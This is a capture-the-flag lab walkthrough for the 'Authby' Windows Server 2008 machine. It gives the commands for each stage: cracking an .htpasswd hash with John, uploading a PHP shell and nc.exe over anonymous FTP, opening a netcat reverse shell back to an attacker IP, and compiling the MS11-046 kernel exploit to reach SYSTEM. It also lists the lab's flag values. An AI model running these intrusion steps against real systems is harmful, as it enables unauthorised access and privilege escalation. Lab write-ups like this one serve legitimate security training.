# Authby - FTP & Windows Privilege Escalation Walkthrough

This is a full exploitation walkthrough for the Authby lab machine. The machine features a vulnerable FTP service with anonymous access, a basic auth-protected web server, and an outdated Windows Server vulnerable to privilege escalation via MS11-046. The goal was to gain remote access, escalate to SYSTEM, and retrieve both flags.

## Target Information

IP Address: 192.168.224.46  
Operating System: Windows Server 2008  
Hostname: LIVDA  
Open Ports:
- 21 (FTP - zFTPServer 6.0)
- 242 (HTTP - Apache/2.2.21 with PHP/5.3.8)
- 3145 (zFTP admin panel)
- 3389 (RDP)

## Enumeration

Performed full Nmap scan:

nmap -T4 -A -Pn -p- 192.168.224.46 -o nmap

Found:
- FTP allows anonymous login (port 21)
- Apache web server on port 242 with HTTP Basic Auth
- zFTPServer admin interface on port 3145
- RDP over port 3389

Enumerated files on FTP:
- Various installation and service batch files
- /accounts directory exposed
- Found .htpasswd file with hashed credentials

## Brute Force & Credential Extraction

Downloaded .htpasswd and found hash:

offsec:$apr1$oRfRsc/K$UpYpplHDlaemqseM39Ugg0

Saved to file and cracked with John:

echo 'offsec:$apr1$oRfRsc/K$UpYpplHDlaemqseM39Ugg0' > offsec.txt  
john --wordlist=/usr/share/seclists/Passwords/xato-net-10-million-passwords.txt offsec.txt

Result:
Username: offsec  
Password: elite

Tested credentials on Apache web server at port 242 — login successful.

## Uploading PHP Shell

Checked FTP write permissions — upload to web root was allowed.

Uploaded PHP reverse shell (shell.php) and Netcat binary (nc.exe) via FTP:

ftp admin@192.168.224.46  
put shell.php  
put nc.exe

Triggered reverse shell:

http://192.168.224.46:242/shell.php?cmd=nc.exe 192.168.45.238 6658 -e cmd

Listener:

rlwrap nc -nlvp 6658

Received reverse shell as user: apache

## User Flag

Located user flag at:

C:\Users\apache\Desktop\local.txt  
Flag: 3d77bf6ade47b098464343c50e95e42d

## Privilege Escalation

Checked system version with `systeminfo` — confirmed target is Windows Server 2008 Build 6001 (vulnerable).

Identified MS11-046 as a working kernel exploit.

Used searchsploit:

searchsploit MS11-046  
searchsploit -m 40564.c

Compiled exploit:

i686-w64-mingw32-gcc 40564.c -o pwn.exe -lws2_32

Uploaded pwn.exe via FTP to target.

Executed exploit and received SYSTEM shell.

## Root Flag

Located at:

C:\Users\Administrator\Desktop\proof.txt  
Flag: 6edb2e7a80216790ef4acf6182a71251

## Tools Used

- nmap  
- ftp client  
- john  
- PHP reverse shell  
- nc.exe  
- searchsploit  
- mingw (i686-w64-mingw32-gcc)  
- MS11-046 local privilege escalation exploit

## Summary

- Gained anonymous access to FTP and discovered .htpasswd  
- Cracked credentials for user `offsec` and accessed protected web server  
- Uploaded PHP reverse shell and Netcat  
- Got a shell as user `apache`  
- Escalated privileges using MS11-046 to SYSTEM  
- Retrieved both user and root flags

## Author

Farhanahmad Quraishi
